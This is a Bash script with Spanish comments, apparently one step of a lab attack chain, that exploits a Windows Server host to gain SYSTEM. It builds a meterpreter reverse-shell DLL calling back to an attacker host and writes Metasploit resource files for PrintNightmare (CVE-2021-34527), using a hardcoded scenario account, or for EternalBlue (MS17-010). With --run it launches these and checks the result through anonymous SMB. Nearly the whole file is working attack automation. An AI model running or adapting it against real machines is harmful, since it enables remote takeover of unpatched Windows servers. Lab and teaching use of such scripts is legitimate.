#!/usr/bin/env bash
# ============================================================================
#  lab/chain/04-m3-to-m4.sh — salto 4: M3 (root) → M4 (SYSTEM)
# ----------------------------------------------------------------------------
#  Vulnerabilidad por defecto: PrintNightmare (CVE-2021-34527) en el spooler
#  de M4, con la cuenta limitada `soporte`. Es la opción que SÍ cubre
#  Windows Server 2016 build 14393.
#
#  `--eternalblue` usa MS17-010, pero el módulo de Metasploit NO soporta
#  14393: solo tiene sentido si M4 es Server 2012 R2 (build 9600).
#
#  Uso:
#    bash lab/chain/04-m3-to-m4.sh              # imprime y verifica
#    bash lab/chain/04-m3-to-m4.sh --run        # PrintNightmare
#    bash lab/chain/04-m3-to-m4.sh --eternalblue --run
# ============================================================================

set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_LOG
. "$HERE/../common/lib.sh"
LAB_ROLE=chain

RUN=0
MODE="printnightmare"
WORK="${LAB_WORK:-${HOME:-/tmp}/lab-work}"
LHOST="${LHOST:-$M6}"
SHARE="${M4_SHARE:-Transfer}"
MARKER="PWNED-M4.txt"
PN_USER="${PN_USER:-soporte}"
PN_PASS="${PN_PASS:-Soporte2026!}"

while (($#)); do
  case "$1" in
    --run) RUN=1; shift ;;
    --eternalblue) MODE="eternalblue"; shift ;;
    -h|--help) echo "Uso: $0 [--run] [--eternalblue]"; exit 0 ;;
    *) die "opción desconocida: $1" ;;
  esac
done

lab_banner
step "salto 4 · M3 (${M3}, root) → M4 (${M4}, SYSTEM)"

if [[ "$MODE" == "printnightmare" ]]; then
  cat <<EOF
Vulnerabilidad: PrintNightmare (CVE-2021-34527) en el spooler de M4.
Cuenta limitada del escenario: ${PN_USER}/${PN_PASS}.

  nmap -Pn -p445,135,139 $M4
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o $WORK/pn.dll
  msfconsole -q -r $WORK/pn.rc
  smbclient //$M4/$SHARE -N -c 'get $MARKER'

Si el módulo no aparece, dentro de msfconsole: search printnightmare
EOF
else
  cat <<EOF
Vulnerabilidad: MS17-010 / EternalBlue (solo Server 2012 R2 build 9600).
En Windows Server 2016 (14393) el módulo de Metasploit aborta con
"This exploit does not support this build": usar PrintNightmare.

  nmap -Pn -p445 --script smb-vuln-ms17-010 $M4
  msfconsole -q -r $WORK/ms17.rc
  smbclient //$M4/$SHARE -N -c 'get $MARKER'
EOF
fi

step "verificación (nmap)"
if command -v nmap >/dev/null 2>&1; then
  if [[ "$MODE" == "eternalblue" ]]; then
    nmap -Pn -p445 --script smb-vuln-ms17-010 "$M4" || warn "nmap falló"
  else
    nmap -Pn -p445,135,139 "$M4" || warn "nmap falló"
  fi
else
  warn "sin nmap; se omite la verificación"
fi

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se lanza el exploit. Para atacar: --run\n' >&2
  exit 0
fi

command -v msfconsole >/dev/null 2>&1 || die "falta msfconsole (metasploit-framework)"
mkdir -p "$WORK"

if [[ "$MODE" == "printnightmare" ]]; then
  step "generando DLL del payload"
  command -v msfvenom >/dev/null 2>&1 || die "falta msfvenom"
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT=4444 \
    -f dll -o "$WORK/pn.dll" >/dev/null || die "msfvenom falló"
  ok "DLL: $WORK/pn.dll"

  step "recurso de Metasploit (PrintNightmare)"
  cat > "$WORK/pn.rc" <<EOF
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS $M4
set SMBUser $PN_USER
set SMBPass $PN_PASS
set SRVHOST $LHOST
set DLL $WORK/pn.dll
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4444
set ExitOnSession false
exploit -z
sleep 40
sessions -l
exit
EOF
  ok "recurso: $WORK/pn.rc"
  step "lanzando PrintNightmare"
  msfconsole -q -r "$WORK/pn.rc" || warn "msfconsole terminó con error"
else
  step "recurso de Metasploit (EternalBlue)"
  cat > "$WORK/ms17.rc" <<EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $M4
set RPORT 445
set PAYLOAD windows/x64/exec
set CMD whoami > C:/$SHARE/$MARKER & hostname >> C:/$SHARE/$MARKER
set ExitOnSession false
exploit -z
sleep 120
exit
EOF
  ok "recurso: $WORK/ms17.rc"
  step "lanzando EternalBlue"
  msfconsole -q -r "$WORK/ms17.rc" || warn "msfconsole terminó con error"
fi

step "leyendo el marcador por SMB (sin credenciales)"
if command -v smbclient >/dev/null 2>&1; then
  rm -f "$WORK/$MARKER"
  smbclient "//$M4/$SHARE" -N -c "get $MARKER $WORK/$MARKER" >/dev/null 2>&1 || true
  if [[ -s "$WORK/$MARKER" ]]; then
    cat "$WORK/$MARKER"
    grep -qi 'system' "$WORK/$MARKER" \
      && ok "SYSTEM en M4 confirmado" \
      || warn "marcador leído, pero no dice SYSTEM"
  else
    warn "sin marcador por SMB anónimo."
    warn "Alternativas: msfconsole > sessions -i 1 > getuid; o smbclient -U '$PN_USER%$PN_PASS'"
  fi
else
  warn "sin smbclient; revisar C:/$SHARE/$MARKER por WinRM o consola"
fi
